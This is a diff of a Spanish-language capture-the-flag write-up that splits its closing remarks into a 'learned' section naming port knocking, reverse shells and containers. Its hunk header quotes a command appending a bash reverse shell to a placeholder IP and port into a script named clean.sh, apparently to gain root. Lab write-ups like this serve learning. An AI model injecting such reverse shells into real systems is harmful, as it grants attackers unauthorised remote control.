@@ -93,5 +93,8 @@ echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> clean.sh
 
 ![root](Img/root.png)
 
-De esta manera ya somos root y ya podemos leer la flag, en esta máquina he aprendido conceptos nuevos como el port knocking y he repasado conceptos como reverse shell, claves, strings y contenedores.
+De esta manera ya somos root y ya podemos leer la flag.
+### Aprendido
+
+En esta máquina he aprendido conceptos nuevos como el port knocking y he repasado conceptos como reverse shell, claves, strings y contenedores.
 
